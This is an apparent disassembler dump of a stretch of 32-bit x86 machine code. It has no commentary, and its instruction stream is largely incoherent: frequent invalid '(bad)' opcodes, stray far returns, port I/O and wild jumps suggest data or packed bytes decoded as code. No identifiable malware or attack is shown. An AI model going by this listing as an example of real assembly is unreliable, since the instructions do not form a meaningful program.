  40e5a9:	jb     0x40e579
  40e5ab:	add    dh,dl
  40e5ad:	dec    ebp
  40e5ae:	scas   eax,DWORD PTR es:[edi]
  40e5af:	mov    ecx,DWORD PTR [ebx+0x7dcbc4e8]
  40e5b5:	shr    DWORD PTR [ebx],cl
  40e5b7:	into   
  40e5b8:	cmp    edx,esi
  40e5ba:	mov    ebp,DWORD PTR [edi-0x1bfcfc58]
  40e5c0:	dec    ebp
  40e5c1:	dec    ebp
  40e5c2:	mov    ecx,DWORD PTR [ebx+0x55d3e8f8]
  40e5c8:	retf   
  40e5c9:	xor    edx,esi
  40e5cb:	add    ecx,esi
  40e5cd:	imul   ecx,edx
  40e5d0:	mov    DWORD PTR [ebp+0x8],edx
  40e5d3:	xor    ecx,DWORD PTR [ebp+0x2b]
  40e5d6:	mov    DWORD PTR [ebx+0x7d4de8ec],ecx
  40e5dc:	add    esi,DWORD PTR [ebx]
  40e5de:	mov    ah,0x3
  40e5e0:	inc    ebp
  40e5e1:	rdtsc  
  40e5e3:	xlat   BYTE PTR ds:[ebx]
  40e5e4:	pushf  
  40e5e5:	jge    0x40e570
  40e5e7:	xor    ebx,eax
  40e5e9:	sub    eax,DWORD PTR [ebp-0x73]
  40e5ec:	(bad)  
  40e5ed:	cmp    al,al
  40e5ef:	jb     0x40e576
  40e5f1:	add    al,bh
  40e5f3:	ror    DWORD PTR [ebp-0x7a],1
  40e5f6:	xor    edi,edi
  40e5f8:	add    edi,edi
  40e5fa:	jmp    0x40e649
  40e5fc:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40e602:	dec    ebp
  40e603:	into   
  40e604:	mov    ebp,DWORD PTR [edi-0x23737428]
  40e60a:	fwait
  40e60b:	shl    DWORD PTR [edx],cl
  40e60d:	retf   0x5588
  40e610:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40e616:	add    eax,DWORD PTR [eax]
  40e618:	in     al,0x4d
  40e61a:	push   ebp
  40e61b:	mov    ecx,DWORD PTR [edx+0x72cb11e0]
  40e621:	gs add ch,cl
  40e624:	dec    ebp
  40e625:	sub    ecx,DWORD PTR [edx+0x55f00b03]
  40e62b:	dec    ebp
  40e62c:	xor    ecx,DWORD PTR [ebx-0x341b3bfd]
  40e632:	jge    0x40e602
  40e634:	mov    BYTE PTR [edi+0xf723b3a],ch
  40e63a:	add    cl,dh
  40e63c:	dec    ebp
  40e63d:	dec    DWORD PTR [ebx-0x2c032375]
  40e643:	adc    BYTE PTR [ebp+0x1],0x8b
  40e647:	add    al,bl
  40e649:	jge    0x40e5d7
  40e64b:	push   0xffffff9b
  40e64d:	push   0x8b3032
  40e652:	shl    BYTE PTR [ebp+0x55],0x6a
  40e656:	xor    edi,edi
  40e658:	xor    edx,DWORD PTR [ebx+eax*1]
  40e65b:	inc    ebp
  40e65c:	add    eax,DWORD PTR [ebp-0x7c358bf1]
  40e662:	dec    ebp
  40e663:	or     BYTE PTR [ecx+0x4dc8e483],cl
  40e669:	jbe    0x40e5f6
  40e66b:	mov    ebp,esp
  40e66d:	ror    bl,1
  40e66f:	enter  0x14ce,0xaf
  40e673:	dec    DWORD PTR [ebx-0x2cef17f8]
  40e679:	push   ebp
  40e67a:	retf   0x5540
  40e67d:	push   ebp
  40e67e:	mov    esi,DWORD PTR [edx-0x1c]
  40e681:	mov    edx,ebx
  40e683:	cld    
  40e684:	(bad)  
  40e685:	sub    BYTE PTR [edi-0x23ff74ff],0x0
  40e68c:	sti    
  40e68d:	add    dh,cl
  40e68f:	push   0xffffff94
  40e691:	call   FWORD PTR [ebx+0x3b5032d0]
  40e697:	mov    ecx,DWORD PTR [edi]
  40e699:	int3   
  40e69a:	pop    esi
  40e69b:	inc    ebp
  40e69c:	dec    DWORD PTR [ecx+0x45e8c88b]
  40e6a2:	push   ebp
  40e6a3:	xor    esi,DWORD PTR [ebx]
  40e6a5:	mov    DWORD PTR [ebx],0xcace0f9c
  40e6ab:	aas    
  40e6ac:	push   ebp
  40e6ad:	inc    ebp
  40e6ae:	xor    edx,esi
  40e6b0:	add    edx,esi
  40e6b2:	mov    eax,DWORD PTR [ebx]
  40e6b4:	(bad)  
  40e6b5:	jmp    0x40e643
  40e6b7:	mov    bl,BYTE PTR [ebx-0x7674cdfb]
  40e6bd:	rol    ah,1
  40e6bf:	mov    esi,0xf133104d
  40e6c4:	mov    edx,0xff388d80
  40e6c9:	mov    dh,0xd1
  40e6cb:	cmp    edx,DWORD PTR [ebp+0xf]
  40e6ce:	mov    eax,DWORD PTR [edx-0x20]
  40e6d1:	add    BYTE PTR [ebp-0x75],bh
  40e6d4:	xor    edi,DWORD PTR [ebx+eax*1-0x307bf035]
  40e6db:	fwait
  40e6dc:	retf   0x8632
  40e6df:	cmp    ebp,0x8
  40e6e2:	call   ebx
  40e6e4:	inc    ebp
  40e6e5:	inc    ebp
  40e6e6:	mov    ecx,DWORD PTR [ebx+0x450008d8]
  40e6ec:	mov    esi,DWORD PTR [ecx]
  40e6ee:	enter  0x49c,0xc7
  40e6f2:	add    al,al
  40e6f4:	add    bl,al
  40e6f6:	(bad)  
  40e6f7:	clc    
  40e6f8:	enter  0x45,0x31
  40e6fc:	push   eax
  40e6fd:	pushf  
  40e6fe:	mov    edi,eax
  40e700:	int3   
  40e701:	or     al,al
  40e703:	test   DWORD PTR [edi],edi
  40e705:	clc    
  40e706:	gs inc ebp
  40e708:	add    BYTE PTR [ebx+0x4d00fc7d],cl
  40e70e:	push   ss
  40e70f:	xor    ecx,DWORD PTR [ebp+0x3]
  40e712:	sub    edx,DWORD PTR [ecx-0x76]
  40e715:	dec    ebp
  40e716:	add    DWORD PTR [ebx+0x88d845],ecx
  40e71c:	mov    esi,DWORD PTR [ebx]
  40e71e:	or     BYTE PTR [ebx],al
  40e720:	cmp    edx,DWORD PTR [ecx-0x38]
  40e723:	dec    ebp
  40e724:	out    dx,eax
  40e725:	xor    eax,DWORD PTR [ebp+0x3]
  40e728:	mov    edx,DWORD PTR [ecx-0x28]
  40e72b:	dec    ebp
  40e72c:	add    BYTE PTR [ebx],dh
  40e72e:	push   0x518003
  40e733:	push   eax
  40e734:	add    BYTE PTR [ebx-0x300748b],cl
  40e73a:	sbb    BYTE PTR [ebp+0x45],cl
  40e73d:	mov    ecx,DWORD PTR [ecx+0x7d00d0d8]
  40e743:	xor    ecx,DWORD PTR [ebx-0x3cae0bfd]
  40e749:	dec    ebp
  40e74a:	inc    ebp
  40e74b:	xor    edx,esi
  40e74d:	add    edx,esi
  40e74f:	push   ecx
  40e750:	(bad)  
  40e751:	dec    ebp
  40e752:	mov    al,ds:0xc5e03dff
  40e757:	retf   
  40e758:	(bad)  
  40e759:	into   
  40e75a:	sub    bh,bh
  40e75c:	dec    esp
  40e75d:	adc    al,0x9c
  40e75f:	inc    ebp
  40e760:	push   ebp
  40e761:	test   DWORD PTR [edi],ecx
  40e763:	unpcklps xmm0,XMMWORD PTR [ecx-0x7ab9ff80]
  40e76a:	jmp    0xc9b9f67e
  40e76f:	add    cl,dl
  40e771:	mov    DWORD PTR [ebp+0x8501c0],0x33454df8
  40e77b:	xor    ecx,DWORD PTR [ebp+0x728b089c]
  40e781:	rol    BYTE PTR [eax],0x54
  40e784:	clc    
  40e785:	gs jb  0x40e78f
  40e788:	mov    eax,DWORD PTR [ebp-0x30]
  40e78b:	xor    al,0x40
  40e78d:	sub    al,0xc7
  40e78f:	mov    ah,ch
  40e791:	add    DWORD PTR [ebp+0x4534f845],eax
  40e797:	sub    al,0x80
  40e799:	mov    BYTE PTR [edx+eax*1-0x335a39],bl
  40e7a0:	mov    ch,0xff
  40e7a2:	clc    
  40e7a3:	add    DWORD PTR [ebp+0x60],0x3d
  40e7a7:	call   FWORD PTR [eax+eax*1-0x1f7a77]
  40e7ae:	inc    ebp
  40e7af:	dec    DWORD PTR [ebx-0x341ff701]
  40e7b5:	test   esi,ecx
  40e7b7:	dec    DWORD PTR [ebx-0x7f8a3301]
  40e7bd:	push   eax
  40e7be:	add    DWORD PTR [ebp+0x0],eax
  40e7c1:	dec    ebx
  40e7c3:	or     al,0xce
  40e7c5:	ror    BYTE PTR [ebx-0x34173fb0],0x4
  40e7cc:	into   
  40e7cd:	add    BYTE PTR [ebx-0x34ff1400],cl
  40e7d3:	mov    esi,ecx
  40e7d5:	sar    bh,0x45
  40e7d8:	adc    al,0x8b
  40e7da:	clc    
  40e7db:	fadd   DWORD PTR [ebp+0x0]
  40e7de:	mov    ebp,DWORD PTR [edx+0x8]
  40e7e1:	push   edi
  40e7e2:	adc    BYTE PTR [eax+0x1],0x83
  40e7e6:	add    al,al
  40e7e8:	retf   
  40e7e9:	mov    ecx,esi
  40e7eb:	cld    
  40e7ec:	mov    eax,DWORD PTR [eax+0xcb01cc]
  40e7f2:	into   
  40e7f3:	add    BYTE PTR [ebx+0x756aec00],cl
  40e7f9:	jne    0x40e82e
  40e7fb:	inc    DWORD PTR [ebx]
  40e7fd:	rcl    BYTE PTR [ecx+0x50],1
  40e800:	push   eax
  40e801:	mov    ecx,DWORD PTR [ecx-0xbaf7f8]
  40e807:	mov    eax,DWORD PTR [eax+eiz*8-0x14ffbafd]
  40e80e:	sar    bh,0x84
  40e811:	or     BYTE PTR [ebx],al
  40e813:	push   eax
  40e814:	add    BYTE PTR [ebx+0x453cc845],cl
  40e81a:	pushf  
  40e81b:	xor    edi,eax
  40e81d:	pushf  
  40e81e:	mov    ah,0x89
  40e820:	test   eax,ebp
  40e822:	clc    
  40e823:	inc    ebp
  40e824:	inc    ebp
  40e825:	mov    DWORD PTR [eax+eax*8],esi
  40e828:	sub    al,0x32
  40e82a:	mov    BYTE PTR [ebx+ecx*4+0x54d8ec89],bl
  40e831:	dec    ebp
  40e832:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e836:	mov    ecx,DWORD PTR [ecx+0x4d54f4b4]
  40e83c:	xor    eax,DWORD PTR gs:[edi+0x3]
  40e840:	or     DWORD PTR [ecx+0x45ff085c],0x0
  40e847:	shl    DWORD PTR [ebp-0x380064],1
  40e84d:	int3   
  40e84e:	lea    eax,[ebp+0x45fff860]
  40e854:	push   eax
  40e855:	cmp    al,0x75
  40e857:	pushf  
  40e858:	(bad)  
  40e859:	(bad)  
  40e85a:	pop    esp
  40e85b:	lods   al,BYTE PTR ds:[esi]
  40e85c:	inc    DWORD PTR [ebp+0x4508f8ff]
  40e862:	mov    edi,DWORD PTR [esi]
  40e864:	rcr    BYTE PTR [eax+esi*2+0x10b883c7],1
  40e86b:	test   DWORD PTR [edi-0x8],edx
  40e86e:	inc    esi
  40e86f:	inc    ebp
  40e870:	add    BYTE PTR [eax],bh
  40e872:	push   0x8b809c
  40e877:	in     al,dx
  40e878:	inc    ebp
  40e879:	push   ebp
  40e87a:	mov    esi,DWORD PTR [ebx]
  40e87c:	cld    
  40e87d:	add    eax,DWORD PTR [eax+0xf013b]
  40e883:	adc    al,0x0
  40e885:	add    bh,bh
  40e887:	jmp    0xbde9a4
  40e88c:	add    BYTE PTR [ebp+0x45],cl
  40e88f:	mov    ecx,DWORD PTR [ebx+0xd1d8e8]
  40e895:	dec    ebp
  40e896:	push   0x38033
  40e89b:	cmp    eax,DWORD PTR [eax]
  40e89d:	unpcklps xmm7,xmm0
  40e8a0:	jne    0x40e8a2
  40e8a2:	dec    DWORD PTR [ebx+0x5545cc18]
  40e8a8:	mov    DWORD PTR [ebx],esi
  40e8aa:	shl    BYTE PTR [ebx],1
  40e8ac:	inc    ebp
  40e8ad:	add    ecx,DWORD PTR [ecx+0x60fc803]
  40e8b3:	retf   0x5575
  40e8b6:	dec    DWORD PTR [ebx-0x5ba17e8]
  40e8bc:	(bad)  
  40e8bd:	stc    
  40e8be:	in     al,dx
  40e8bf:	or     al,0x85
  40e8c1:	dec    ebp
  40e8c2:	clc    
  40e8c3:	xor    eax,DWORD PTR [ebp+0x3]
  40e8c6:	mov    ebp,ecx
  40e8c8:	rol    BYTE PTR [eax],1
  40e8ca:	inc    ebp
  40e8cb:	add    BYTE PTR [eax-0x7747ab3],bh
  40e8d1:	clc    
  40e8d2:	inc    ebp
  40e8d3:	retf   
  40e8d4:	mov    edx,ebx
  40e8d6:	in     al,dx
  40e8d7:	(bad)  
  40e8d8:	retf   
  40e8d9:	into   
  40e8da:	into   
  40e8db:	scas   eax,DWORD PTR es:[edi]
  40e8dc:	dec    ebp
  40e8dd:	mov    ecx,DWORD PTR [ebx-0x3482130c]
  40e8e3:	sub    ecx,esi
  40e8e5:	cmp    ecx,DWORD PTR [ebp+0x77]
  40e8e8:	(bad)  
  40e8e9:	mov    edi,eax
  40e8eb:	int3   
  40e8ec:	test   DWORD PTR [ecx-0x74baff08],ecx
  40e8f2:	xor    ebp,DWORD PTR [esp+ebx*4-0x57cc38ab]
  40e8f9:	xor    eax,DWORD PTR [ebp+0x4503f803]
  40e8ff:	(bad)  
  40e901:	retf   0x559c
  40e904:	(bad)  
  40e905:	mov    esp,DWORD PTR [eax+ebp*8-0x607057b]
  40e90c:	inc    ebp
  40e90d:	add    eax,0xeb9c4d3f
  40e912:	(bad)  
  40e913:	mov    esi,DWORD PTR [eax-0x7aa7a5c]
  40e919:	xor    ecx,DWORD PTR [ebp+0x33]
  40e91c:	mov    eax,DWORD PTR [ebx]
  40e91e:	call   0xce50b426
  40e923:	retf   0x55d1
  40e926:	test   BYTE PTR [ebx-0x5ff17fe],cl
  40e92c:	jmp    0x40e927
  40e92e:	add    BYTE PTR ds:0xebf44d8b,al
  40e934:	push   ebp
  40e935:	mov    ebp,DWORD PTR [ebx]
  40e937:	mov    eax,0x33f8558b
  40e93c:	retf   
  40e93d:	xor    ecx,esi
  40e93f:	add    edx,ecx
  40e941:	add    eax,DWORD PTR [edx+0xca010f]
  40e947:	push   ebp
  40e948:	dec    ebp
  40e949:	mov    ecx,DWORD PTR [ebx-0x34050718]
  40e94f:	stc    
  40e950:	rol    DWORD PTR ds:0xebce4dd6,cl
  40e956:	scas   eax,DWORD PTR es:[edi]
  40e957:	mov    ecx,DWORD PTR [ebx+0x7d55f4b0]
  40e95d:	xor    ebp,DWORD PTR [ebx]
  40e95f:	xor    edi,DWORD PTR [ebx]
  40e961:	add    esi,DWORD PTR [edi+0x3]
  40e964:	mov    ecx,DWORD PTR [edi]
  40e966:	clc    
  40e967:	retf   0x55cb
  40e96a:	into   
  40e96b:	mov    edi,DWORD PTR [eax+ebp*8-0x6740600]
  40e972:	test   al,0x4d
  40e974:	push   ebp
  40e975:	jbe    0x40e9aa
  40e977:	mov    esi,DWORD PTR [ebx]
  40e979:	mov    al,0x3
  40e97b:	push   ebp
  40e97c:	add    esi,DWORD PTR [ebx]
  40e97e:	rdpmc  
  40e980:	retf   0x5503
  40e983:	add    ecx,DWORD PTR [ebx-0x53517f1]
  40e989:	dec    ebp
  40e98a:	stc    
  40e98b:	mov    ecx,DWORD PTR [eax]
  40e98d:	or     BYTE PTR [ebp+0x4d],cl
  40e990:	jmp    0x134ea20
  40e995:	dec    ebp
  40e996:	dec    ebp
  40e997:	(bad)  
  40e998:	mov    ebx,esp
  40e99a:	clc    
  40e99b:	test   ebx,ecx
  40e99d:	clc    
  40e99e:	ror    DWORD PTR [ebp-0x2a],cl
  40e9a1:	mov    esi,ecx
  40e9a3:	lock scas eax,DWORD PTR es:[edi]
  40e9a5:	inc    ebp
  40e9a6:	mov    esi,DWORD PTR [ebx]
  40e9a8:	hlt    
  40e9a9:	pushf  
  40e9aa:	jge    0x40e937
  40e9ac:	sub    ebx,esp
  40e9ae:	cmp    ecx,ebx
  40e9b0:	ja     0x40e980
  40e9b2:	mov    ebp,DWORD PTR [eax-0x58]
  40e9b5:	dec    ebp
  40e9b6:	xor    ecx,DWORD PTR [di+0x3]
  40e9ba:	mov    esp,esp
  40e9bc:	clc    
  40e9bd:	push   ebp
  40e9be:	retf   
  40e9bf:	mov    dl,bl
  40e9c1:	adc    esi,edx
  40e9c3:	jb     0x40e993
  40e9c5:	add    BYTE PTR [edi-0xb7474b3],ch
  40e9cb:	lock jge 0x40e999
  40e9ce:	sub    ecx,DWORD PTR [ebp+0x3b]
  40e9d1:	mov    esi,DWORD PTR [edi-0x20]
  40e9d4:	mov    ecx,DWORD PTR [esp+ebp*4+0x4d32459b]
  40e9db:	mov    BYTE PTR [ebx-0x34b20729],cl
  40e9e1:	mov    edx,ebx
  40e9e3:	lock (bad) 
  40e9e5:	ror    esi,cl
  40e9e7:	push   ebp
  40e9e8:	scas   eax,DWORD PTR es:[edi]
  40e9e9:	mov    ecx,DWORD PTR [ebx+0x7d8cf4e0]
  40e9ef:	fwait
  40e9f0:	sub    esi,DWORD PTR [edx]
  40e9f2:	cmp    ecx,DWORD PTR [edx+0x558bd777]
  40e9f8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40e9f9:	xor    esp,DWORD PTR [ebx]
  40e9fb:	add    ecx,DWORD PTR [ebp-0x1c]
  40e9fe:	mov    edi,DWORD PTR [ebp-0x8]
  40ea01:	mov    bl,cl
  40ea03:	cmp    dl,bl
  40ea05:	jb     0x40e9d5
  40ea07:	add    dh,dl
  40ea09:	dec    ebp
  40ea0a:	scas   eax,DWORD PTR es:[edi]
  40ea0b:	mov    ecx,DWORD PTR [ebx+0x7dcbf4f0]
  40ea11:	shr    DWORD PTR [ebx],cl
  40ea13:	into   
  40ea14:	cmp    edx,esi
  40ea16:	mov    ebp,DWORD PTR [edi-0x1bfcfc48]
  40ea1c:	dec    ebp
  40ea1d:	dec    ebp
  40ea1e:	mov    ecx,DWORD PTR [ebx+0x55d3f0f8]
  40ea24:	retf   
  40ea25:	xor    edx,esi
  40ea27:	add    ecx,esi
  40ea29:	imul   ecx,edx
  40ea2c:	mov    DWORD PTR [ebp+0x8],edx
  40ea2f:	xor    ecx,DWORD PTR [ebp+0x2b]
  40ea32:	mov    DWORD PTR [ebx+0x7d4df0ec],ecx
  40ea38:	add    esi,DWORD PTR [ebx]
  40ea3a:	rol    BYTE PTR [ebx],0x45
  40ea3d:	rdtsc  
  40ea3f:	xlat   BYTE PTR ds:[ebx]
  40ea40:	pushf  
  40ea41:	jge    0x40e9cc
  40ea43:	xor    esp,eax
  40ea45:	sub    eax,DWORD PTR [ebp-0x73]
  40ea48:	(bad)  
  40ea49:	cmp    dh,BYTE PTR [edx+esi*2-0x2e07ff7b]
  40ea50:	dec    ebp
  40ea51:	xchg   BYTE PTR [ebx],dh
  40ea53:	inc    DWORD PTR [ebx]
  40ea55:	(bad)  
  40ea56:	jmp    0x40eaa5
  40ea58:	mov    ecx,DWORD PTR [ebx-0x34341324]
  40ea5e:	dec    ebp
  40ea5f:	into   
  40ea60:	mov    ebp,DWORD PTR [edi-0x23737420]
  40ea66:	fwait
  40ea67:	shl    DWORD PTR [edx],cl
  40ea69:	retf   0x5588
  40ea6c:	or     ecx,DWORD PTR [ebp+0x7233114d]
  40ea72:	add    eax,DWORD PTR [eax]
  40ea74:	in     al,0x4d
  40ea76:	push   ebp
  40ea77:	mov    ecx,DWORD PTR [edx+0x72cb11d8]
  40ea7d:	gs add ch,cl
  40ea80:	dec    ebp
  40ea81:	sub    ecx,DWORD PTR [edx+0x55e80b03]
  40ea87:	dec    ebp
  40ea88:	xor    ecx,DWORD PTR [ebx-0x341b0bfd]
  40ea8e:	jge    0x40ea5e
  40ea90:	mov    BYTE PTR [edi+0xf723b3a],ch
  40ea96:	add    cl,dh
  40ea98:	dec    ebp
  40ea99:	dec    DWORD PTR [ebx-0x2c032301]
  40ea9f:	inc    ebp
  40eaa0:	push   ebp
  40eaa1:	dec    DWORD PTR [ebx-0x73ff1f34]
  40eaa7:	lea    ebx,[ebx-0x7400cdac]
  40eaad:	push   eax
  40eaae:	mov    ah,0x45
  40eab0:	push   ebp
  40eab1:	mov    esi,DWORD PTR [ebx]
  40eab3:	les    esi,FWORD PTR [ebx]
  40eab5:	add    BYTE PTR [ebx],al
  40eab7:	inc    DWORD PTR [ebx]
  40eab9:	mov    ecx,DWORD PTR [edi]
  40eabb:	cld    
  40eabc:	retf   0x4d80
  40eabf:	add    DWORD PTR [ecx+0x4d30e400],ecx
  40eac5:	jne    0x40ea52
  40eac7:	(bad)  
  40eac8:	in     al,dx
  40eac9:	ror    bl,1
  40eacb:	scas   al,BYTE PTR es:[edi]
  40eacc:	into   
  40eacd:	add    BYTE PTR [edi-0xf2f7475],ch
  40ead3:	not    bl
  40ead5:	adc    al,0xca
  40ead7:	inc    ebp
  40ead8:	push   ebp
  40ead9:	mov    ecx,DWORD PTR [ebx-0x2cff1b28]
  40eadf:	push   0xaf80d6
  40eae4:	mov    eax,DWORD PTR [eax]
  40eae6:	fdiv   st(7),st
  40eae8:	sti    
  40eae9:	sbb    dh,cl
  40eaeb:	pop    esi
  40eaec:	xchg   esp,eax
  40eaed:	leave  
  40eaee:	fwait
  40eaef:	add    al,0x32
  40eaf1:	push   ebp
  40eaf2:	cmp    ebp,esp
  40eaf4:	sqrtps xmm3,XMMWORD PTR [esi+0x45]
  40eaf8:	dec    DWORD PTR [ecx-0x740f0375]
  40eafe:	push   ebp
  40eaff:	cld    
  40eb00:	xor    ecx,DWORD PTR [edi-0x76f07efd]
  40eb06:	retf   0x558b
  40eb09:	clc    
  40eb0a:	xor    esi,eax
  40eb0c:	add    esi,DWORD PTR [ebp-0x75]
  40eb0f:	(bad)  
  40eb10:	hlt    
  40eb11:	or     cl,BYTE PTR [esi+eax*8-0x39cdf765]
  40eb18:	mov    DWORD PTR [edx],ecx
  40eb1a:	hlt    
  40eb1b:	(bad)  
  40eb1c:	dec    ebp
  40eb1d:	add    dh,BYTE PTR [ebx]
  40eb1f:	leave  
  40eb20:	mov    edx,0xffec8d55
  40eb25:	push   ecx
  40eb26:	rol    DWORD PTR [ebp+0x55],1
  40eb29:	mov    DWORD PTR [ebx+0x7d55d8fc],ecx
  40eb2f:	mov    eax,0xf8030b33
  40eb34:	lar    ecx,di
  40eb37:	push   ebp
  40eb38:	retf   0x863b
  40eb3b:	jne    0x40eb3a
  40eb3d:	mov    edi,edi
  40eb3f:	or     BYTE PTR [ebp+0x41],dh
  40eb42:	mov    ebp,edx
  40eb44:	cld    
  40eb45:	inc    eax
  40eb46:	mov    al,0x25
  40eb48:	add    DWORD PTR [ecx+0x0],eax
  40eb4b:	in     eax,dx
  40eb4c:	test   DWORD PTR [ecx-0x1],eax
  40eb4f:	(bad)  
  40eb51:	ret    0x8b
  40eb54:	cld    
  40eb55:	mov    eax,DWORD PTR [eax+0x8d0151]
  40eb5b:	clc    
  40eb5c:	xor    BYTE PTR [ebp+0x45],al
  40eb5f:	mov    ecx,DWORD PTR [ebx+0x8fc0fc]
  40eb65:	loopne 0x40eb66
  40eb67:	mov    edi,edi
  40eb69:	mov    ecx,eax
  40eb6b:	clc    
  40eb6c:	jne    0x40eb3e
  40eb6e:	call   0x81fc77
  40eb73:	and    eax,0xc6854575
  40eb78:	je     0x40eb7b
  40eb7a:	mov    eax,esi
  40eb7c:	cld    
  40eb7d:	or     DWORD PTR [eax+0x401c9],eax
  40eb83:	push   ebp
  40eb84:	add    ah,ch
  40eb86:	add    BYTE PTR [ecx+0x6a],dl
  40eb89:	inc    ebp
  40eb8a:	push   esi
  40eb8b:	mov    DWORD PTR [eax-0x4],edx
  40eb8e:	pop    edi
  40eb8f:	mov    ebx,DWORD PTR [ebx-0x4]
  40eb92:	ret    0xb8
  40eb95:	push   es
  40eb96:	mov    ecx,DWORD PTR [ecx-0x77274af]
  40eb9c:	clc    
  40eb9d:	lock inc ebp
  40eb9f:	jne    0x40ebf7
  40eba1:	(bad)  
  40eba2:	jne    0x40eba8
  40eba4:	mov    eax,0xf841ba66
  40eba9:	fiadd  DWORD PTR [esi]
  40ebab:	(bad)  
  40ebac:	jne    0x40ebeb
  40ebae:	cmp    eax,ebx
  40ebb0:	pop    esi
  40ebb1:	mov    ecx,DWORD PTR [eax]
  40ebb3:	push   ecx
  40ebb4:	inc    ecx
  40ebb5:	lea    edi,[esi-0x8]
  40ebb8:	inc    edx
  40ebb9:	inc    ebp
  40ebba:	int    0x8b
  40ebbc:	inc    edx
  40ebbd:	cld    
  40ebbe:	jle    0x40eb7f
  40ebc0:	inc    ecx
  40ebc1:	xchg   eax,esp
  40ebc3:	mov    ebx,eax
  40ebc5:	mov    ecx,DWORD PTR [ebx-0x722fae08]
  40ebcb:	or     edi,eax
  40ebcd:	inc    ebp
  40ebce:	inc    ebp
  40ebcf:	(bad)  
  40ebd0:	mov    ecx,DWORD PTR [eax]
  40ebd2:	cld    
  40ebd3:	(bad)  
  40ebd4:	jmp    0x40ebd7
  40ebd6:	mov    eax,esi
  40ebd8:	mov    DWORD PTR ds:0x4f8c98b,eax
  40ebde:	rcl    BYTE PTR [esi+0xf],1
  40ebe1:	iret   
  40ebe2:	inc    ebp
  40ebe3:	leave  
  40ebe4:	(bad)  
  40ebe5:	dec    DWORD PTR [ecx]
  40ebe7:	mov    eax,esi
  40ebe9:	mov    eax,DWORD PTR [edi]
  40ebeb:	mov    dh,0xdd
  40ebee:	push   es
  40ebef:	nop
  40ebf0:	(bad)  
  40ebf1:	inc    DWORD PTR [ebx]
  40ebf3:	push   esi
  40ebf4:	leave  
  40ebf5:	iret   
  40ebf6:	add    al,0x46
  40ebf8:	push   ebp
  40ebf9:	jmp    0xff9241ea
  40ebfe:	inc    ebp
  40ebff:	push   esi
  40ec00:	mov    DWORD PTR [esi-0x4],eax
  40ec03:	in     eax,dx
  40ec04:	push   ebp
  40ec05:	sbb    BYTE PTR [eax+0x7c6daff],bh
  40ec0b:	add    al,BYTE PTR [edx]
  40ec0d:	mov    edx,DWORD PTR [ebp-0x17]
  40ec10:	cmp    edi,esi
  40ec12:	jne    0x40ec13
  40ec14:	(bad)  
  40ec15:	push   esi
  40ec16:	pop    es
  40ec17:	push   ebp
  40ec18:	mov    ebp,esp
  40ec1a:	or     BYTE PTR [ebp+0x41],al
  40ec1d:	add    edi,esp
  40ec1f:	sub    BYTE PTR [eax-0x4],al
  40ec22:	retf   0xc275
  40ec25:	add    DWORD PTR [eax],eax
  40ec27:	sbb    al,0x8b
  40ec29:	mov    edx,DWORD PTR [ecx+0x14]
  40ec2c:	lea    edx,[edx-0x1ba7508]
  40ec32:	push   esi
  40ec33:	enter  0xd375,0xb8
  40ec37:	test   DWORD PTR [esi],0x6ce0750
  40ec3d:	enter  0xd375,0x3b
  40ec41:	neg    DWORD PTR [esi+0x50]
  40ec44:	or     cl,dl
  40ec46:	inc    edx
  40ec47:	(bad)  
  40ec48:	loope  0x40ec36
  40ec4a:	(bad)  
  40ec4b:	sub    eax,DWORD PTR [ebx]
  40ec4d:	inc    eax
  40ec4e:	loope  0x40eca0
  40ec50:	add    dl,BYTE PTR [eax-0x37]
  40ec53:	push   edi
  40ec54:	push   ebp
  40ec55:	imul   ah
  40ec57:	adc    DWORD PTR [ecx-0x1],0x45
  40ec5b:	add    BYTE PTR [ecx+0x55d3fc00],cl
  40ec61:	lea    edi,[eax-0x7fff4ca]
  40ec67:	mov    eax,0x4550402
  40ec6c:	cmp    ebp,ecx
  40ec6e:	jne    0x40ec1b
  40ec70:	mov    eax,DWORD PTR ds:0x241e808
  40ec76:	in     eax,dx
  40ec77:	add    BYTE PTR [eax-0x7],al
  40ec7a:	out    0x36,eax
  40ec7c:	inc    ecx
  40ec7d:	aas    
  40ec7e:	jmp    0xccaf00
  40ec83:	lock mov edi,DWORD PTR [ebp-0x18]
  40ec87:	and    edi,edi
  40ec89:	mov    edi,edi
  40ec8b:	call   0xe40eed67
  40ec90:	push   es
  40ec91:	add    al,ch
  40ec93:	ud0    edx,DWORD PTR [ebp-0x7574ff01]
  40ec9a:	(bad)  
  40ec9b:	hlt    
  40ec9c:	add    eax,0xffd3e87d
  40eca1:	cmp    bh,0x8
  40eca4:	(bad)  
  40eca5:	fld    DWORD PTR [esi]
  40eca7:	out    dx,al
  40eca8:	call   0xff9febb0
  40ecad:	cmp    al,0x46
  40ecaf:	shl    eax,0x8
  40ecb2:	(bad)  
  40ecb3:	pop    es
  40ecb4:	fisttp QWORD PTR [ebp+0xe577eff]
  40ecba:	push   ebx
  40ecbb:	add    BYTE PTR [ebx+0x24008b56],cl
  40ecc1:	add    BYTE PTR [ebp+0x50],al
  40ecc4:	push   eax
  40ecc5:	add    DWORD PTR [ebx+0x757d1834],ecx
  40eccb:	sub    edx,DWORD PTR [esi-0x24]
  40ecce:	jne    0x40ec86
  40ecd0:	lods   eax,DWORD PTR ds:[esi]
  40ecd1:	mov    edx,DWORD PTR [edx-0x34]
  40ecd4:	dec    esi
  40ecd5:	out    0x83,eax
  40ecd7:	into   
  40ecd8:	push   edi
  40ecda:	loopne 0x40ecaa
  40ecdc:	shr    BYTE PTR [edx+ecx*4+0x0],1
  40ece0:	xor    DWORD PTR [eax-0x741fff01],0xffffffd0
  40ece7:	rol    DWORD PTR [edx],0x8
  40ecea:	mov    esp,ecx
  40ecec:	cmp    DWORD PTR [ebx],0xc
  40ecef:	mov    esi,0x5001c0
  40ecf4:	push   eax
  40ecf5:	push   cs
  40ecf6:	push   eax
  40ecf7:	(bad)  
  40ecf8:	sub    edx,edi
  40ecfa:	push   esi
  40ecfb:	adc    al,0xcb
  40ecfd:	ins    DWORD PTR es:[edi],dx
  40ecfe:	mov    eax,0x203e8
  40ed03:	add    al,ah
  40ed05:	inc    esi
  40ed06:	mov    al,ch
  40ed08:	pop    es
  40ed09:	add    DWORD PTR [eax],0x1
  40ed0c:	add    dh,al
  40ed0e:	add    ah,ch
  40ed10:	rol    DWORD PTR [edx-0xd],1
  40ed13:	cli    
  40ed14:	push   0x4a
  40ed16:	pop    ecx
  40ed17:	retf   0xfe6
